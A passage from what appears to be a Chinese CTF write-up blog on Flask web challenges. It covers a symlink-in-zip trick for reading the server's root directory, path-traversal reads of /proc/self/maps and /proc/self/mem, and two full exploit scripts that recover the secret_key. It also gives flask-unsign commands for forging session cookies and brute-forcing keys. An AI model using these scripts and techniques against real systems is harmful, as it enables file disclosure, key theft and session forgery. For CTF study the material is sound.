</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(uploadpath):
</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>makedirs(uploadpath)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;GET&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            upFile <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>            print(upFile<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>splitext(upFile<span style="color:#f92672">.</span>filename)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;.zip&#39;</span>:
</span></span><span style="display:flex;"><span>                filepath<span style="color:#f92672">=</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>uploadpath<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>md5(upFile<span style="color:#f92672">.</span>filename<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">.zip&#34;</span>
</span></span><span style="display:flex;"><span>                upFile<span style="color:#f92672">.</span>save(filepath)
</span></span><span style="display:flex;"><span>                zipDatas <span style="color:#f92672">=</span> extractFile(filepath)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> zipDatas
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>upFile<span style="color:#f92672">.</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74"> is not a zip file !&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8000</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span></code></pre></div><p>题目允许用户上传zip文件</p>
<p>以下代码是服务端使用unzip命令解压用户上传的zip文件的实现</p>
<p>unzip命令默认禁止了zip slip，即虽然zip文件可以打包包含../路径的文件，但unzip命令解压时会忽略../（避免了任意写文件）</p>
<pre><code>zip slip

通过目录遍历文件名（例如../../evil.sh）的精心构建的存档文件攻击者可以通过Zip Slip 漏洞把恶意文件复制到操作系统中（超出应用本身的控制范围之外）。Zip Slip漏洞可影响多种存档格式，包括zip、tar、jar、war、cpio、apk、rar和7z。
</code></pre>
<pre tabindex="0"><code>#.............

# 其它部分已省略

def extractFile(filepath):
    extractdir=filepath.split(&#39;.&#39;)[0]
    if not os.path.exists(extractdir):
        os.makedirs(extractdir)
    os.system(f&#39;unzip -o {filepath} -d {extractdir}&#39;)
    return redirect(url_for(&#39;display&#39;,extractdir=extractdir))

#.............

# 其它部分已省略
</code></pre><p>解压的文件由以下代码实现文件列表展示（使用os.listdir进行目录读取，使用open进行文件读取）</p>
<p>不允许出现..，避免了目录穿越</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/display/&lt;path:extractdir&gt;&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">display</span>(extractdir<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\.\.&#34;</span>, extractdir, re<span style="color:#f92672">.</span>M <span style="color:#f92672">|</span> re<span style="color:#f92672">.</span>I) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Hacker?&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(extractdir):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> make_response(<span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#ae81ff">404</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(extractdir):
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> open(extractdir, <span style="color:#e6db74">&#39;rb&#39;</span>)
</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> make_response(f<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>                response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Content-Type&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;application/octet-stream&#39;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                fn <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(extractdir)
</span></span><span style="display:flex;"><span>                fn <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;..&#34;</span>] <span style="color:#f92672">+</span> fn
</span></span><span style="display:flex;"><span>                f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;templates/template.html&#34;</span>)
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>                f<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;h1&gt;文件列表:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&#34;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> fn:
</span></span><span style="display:flex;"><span>                    tpath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/display&#39;</span>, extractdir, i)
</span></span><span style="display:flex;"><span>                    ret <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;a href=&#39;&#34;</span> <span style="color:#f92672">+</span> tpath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&gt;&#34;</span> <span style="color:#f92672">+</span> i <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&lt;/a&gt;&lt;br&gt;&#34;</span>
</span></span><span style="display:flex;"><span>                x <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;HTMLTEXT&#34;</span>, ret)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> x
</span></span></code></pre></div><p>创建一个根目录的软连接</p>
<pre tabindex="0"><code>ln -s / root_dir
</code></pre><p>然后进行zip压缩(-y参数用于保持软连接)</p>
<p>zip -r myzip.zip root_dir -y</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527648.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527648.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527648.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527648.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527648.png"
        title="image-20230205152714457" /></p>
<p>zip内容如下</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527318.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527318.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527318.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527318.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051527318.png"
        title="image-20230205152723106" /></p>
<p>上传之后即可遍历根目录，并读取文件</p>
<h1 id="session伪造">Session伪造</h1>
<p>提前注意一下，flask的session不是jwt，它的第一部分是base64加密后的值，后面两部分都是签名</p>
<h2 id="未知secret_key">未知secret_key</h2>
<h3 id="读取堆栈内存">读取堆栈内存</h3>
<p>读取内存获取secret_key</p>
<pre tabindex="0"><code>通过任意文件读取直接读取app.py，适用于secret_key直接写在 (app.py路径可能在/proc/self/cmdline查看当前进程的命令中可以获取)
通过任意文件读取先通过/proc/self/maps读取堆栈分布, 再通过/proc/self/mem读取内存分布来获取
</code></pre><p><strong>读取堆栈分布</strong></p>
<p>由于 <code>/proc/self/mem</code> 内容较多而且存在不可读写部分，直接读取会导致程序崩溃，所以先读取 <code>/proc/self/maps</code> 获取堆栈分布。</p>
<pre tabindex="0"><code>map_list = requests.get(url + f&#34;info?file={bypass}/proc/self/maps&#34;)
map_list = map_list.text.split(&#34;\\n&#34;)
for i in map_list:
    map_addr = re.match(r&#34;([a-z0-9]+)-([a-z0-9]+) rw&#34;, i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print(&#34;Found rw addr:&#34;, start, &#34;-&#34;, end)
</code></pre><p><strong>读取对应位置内存数据</strong></p>
<p>然后读取 <code>/proc/self/mem</code>，读取对应位置的内存数据，再使用正则表达式查找内容。</p>
<pre tabindex="0"><code>res = requests.get(f&#34;{url}/info?file={bypass}/proc/self/mem&amp;start={start}&amp;end={end}&#34;)
if &#34;*abcdefgh&#34; in res.text:
   secret_key = re.findall(&#34;[a-z0-9]{32}\*abcdefgh&#34;, res.text)
      if secret_key:
    print(&#34;Secret Key:&#34;, secret_key[0])
</code></pre><h4 id="catctf2023">catctf2023</h4>
<p>查看源代码发现文件读取链接，尝试任意文件读取，成功</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302050009907.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302050009907.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302050009907.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302050009907.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302050009907.png"
        title="image-20230205000948685" /></p>
<p>依次读取</p>
<pre tabindex="0"><code>proc/self/cmdline 
proc/self/environ
../app.py	#info路由的上一级目录下
</code></pre><p>app.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, session, render_template, Markup
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cat <span style="color:#f92672">import</span> cat
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(
</span></span><span style="display:flex;"><span> __name__,
</span></span><span style="display:flex;"><span> static_url_path<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/&#39;</span>, 
</span></span><span style="display:flex;"><span> static_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;static&#39;</span> 
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;*abcdefgh&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(<span style="color:#e6db74">&#34;/flag&#34;</span>):
</span></span><span style="display:flex;"><span> flag <span style="color:#f92672">=</span> cat(<span style="color:#e6db74">&#34;/flag&#34;</span>)
</span></span><span style="display:flex;"><span> os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#34;/flag&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span> detailtxt <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(<span style="color:#e6db74">&#39;./details/&#39;</span>)
</span></span><span style="display:flex;"><span> cats_list <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> detailtxt:
</span></span><span style="display:flex;"><span> cats_list<span style="color:#f92672">.</span>append(i[:i<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;.&#39;</span>)])
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, cats_list<span style="color:#f92672">=</span>cats_list, cat<span style="color:#f92672">=</span>cat)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/info&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">info</span>():
</span></span><span style="display:flex;"><span> filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./details/&#34;</span> <span style="color:#f92672">+</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span> start <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;start&#39;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span> end <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;end&#39;</span>, <span style="color:#e6db74">&#34;0&#34;</span>)
</span></span><span style="display:flex;"><span> name <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#34;&#34;</span>)[:request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;file&#39;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>index(<span style="color:#e6db74">&#39;.&#39;</span>)]
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;detail.html&#34;</span>, catname<span style="color:#f92672">=</span>name, info<span style="color:#f92672">=</span>cat(filename, start, end))
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin_can_list_root</span>():
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> flag
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span> session[<span style="color:#e6db74">&#39;admin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;NoNoNo&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span> app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5637</span>)
</span></span></code></pre></div><p>阅读源码得知需要伪造admin的session，但是secret_key一直没有找到，用上面的方法读proc/self/fd/不可取，因为没有相应的进程能获得secret_key。</p>
<p>这时候可以读内存(太懒不想写脚本，以后碰到类似的题可以拿来改改就能用)</p>
<p>La佬脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span>re
</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://120.78.216.232:8096/&#34;</span>
</span></span><span style="display:flex;"><span>bypass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../../../&#34;</span>
</span></span><span style="display:flex;"><span>map_list <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;info?file=</span><span style="color:#e6db74">{</span>bypass<span style="color:#e6db74">}</span><span style="color:#e6db74">/proc/self/maps&#34;</span>)
</span></span><span style="display:flex;"><span>map_list <span style="color:#f92672">=</span> map_list<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> map_list:
</span></span><span style="display:flex;"><span>    map_addr <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;([a-z0\d]+)-([a-z0\d]+) rw&#34;</span>, i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> map_addr:
</span></span><span style="display:flex;"><span>        start <span style="color:#f92672">=</span> int(map_addr<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        end <span style="color:#f92672">=</span> int(map_addr<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Found rw addr:&#34;</span>, start, <span style="color:#e6db74">&#34;-&#34;</span>, end)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/info?file=</span><span style="color:#e6db74">{</span>bypass<span style="color:#e6db74">}</span><span style="color:#e6db74">/proc/self/mem&amp;start=</span><span style="color:#e6db74">{</span>start<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;end=</span><span style="color:#e6db74">{</span>end<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;*abcdefgh&#34;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>            secret_key <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">&#34;[a-z\d]</span><span style="color:#e6db74">{32}</span><span style="color:#e6db74">\*abcdefgh&#34;</span>, res<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> secret_key:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;Secret Key:&#34;</span>, secret_key[<span style="color:#ae81ff">0</span>])
</span></span></code></pre></div><p>jiaqiniu师傅的脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://223.112.5.156:50603/&#39;</span>
</span></span><span style="display:flex;"><span>maps_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/info?file=../../../../../proc/self/maps&#34;</span>
</span></span><span style="display:flex;"><span>maps_reg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;([a-z0-9]</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">-[a-z0-9]</span><span style="color:#e6db74">{12}</span><span style="color:#e6db74">) rw.*?00000000 00:00 0&#34;</span>
</span></span><span style="display:flex;"><span>maps <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(maps_reg,requests<span style="color:#f92672">.</span>get(maps_url)<span style="color:#f92672">.</span>text)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> maps:
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    start , end <span style="color:#f92672">=</span> m<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;-&#39;</span>)[<span style="color:#ae81ff">0</span>], m<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;-&#39;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(start,end,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;: &#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    start <span style="color:#f92672">=</span> str(int(start,<span style="color:#ae81ff">16</span>))
</span></span><span style="display:flex;"><span>    end <span style="color:#f92672">=</span> str(int(end,<span style="color:#ae81ff">16</span>)) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    read_url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/info?file=../../../../../proc/self/mem&amp;start=</span><span style="color:#e6db74">{</span>start<span style="color:#e6db74">}</span><span style="color:#e6db74">&amp;end=</span><span style="color:#e6db74">{</span>end<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    res  <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(read_url)<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span>    secret <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[a-z0-9A-Z]</span><span style="color:#e6db74">{32}</span><span style="color:#e6db74">\*abcdefgh&#34;</span>,res)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> secret:
</span></span><span style="display:flex;"><span>        print(secret)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;[a-zA-Z]</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">\{[a-z0-9A-Z-_]*\}&#34;</span>,res)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flag:
</span></span><span style="display:flex;"><span>        print(flag)
</span></span><span style="display:flex;"><span>          
</span></span></code></pre></div><p>得到secret_key:11f1db5bd10d4923bae8feec44fffb93*abcdefgh</p>
<p>读到secret_key后进入下面的已知secret_key伪造部分</p>
<h3 id="爆破key">爆破key</h3>
<p><strong><a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener noreffer">flask-unsign</a>
</strong></p>
<p>加密：</p>
<pre tabindex="0"><code>flask-unsign --sign --cookie &#34;&lt;Session CookieValue&gt;&#34; --secret &#39;&lt;Secretkey&gt;&#39;
</code></pre><p>解密：</p>
<pre tabindex="0"><code>flask-unsign --decode --cookie &#39;&lt;SessionCookieStructure&gt;&#39;
</code></pre><p>爆破key：</p>
<pre tabindex="0"><code>flask-unsign --unsign --cookie &#39;&lt;SessionCookieStructure&gt;&#39;
</code></pre><p>flask-unsign工具可以通过字典爆破key</p>
<pre tabindex="0"><code>flask-unsign --unsign --cookie &#34;eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI&#34; --wordlist dict.txt
</code></pre><h4 id="2022美团杯easypickle">2022美团杯easypickle</h4>
<p>源码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, session
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>hex() <span style="color:#75715e">#设置key为随机打乱的4位数字字母组合例如a8c3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hello_world</span>():
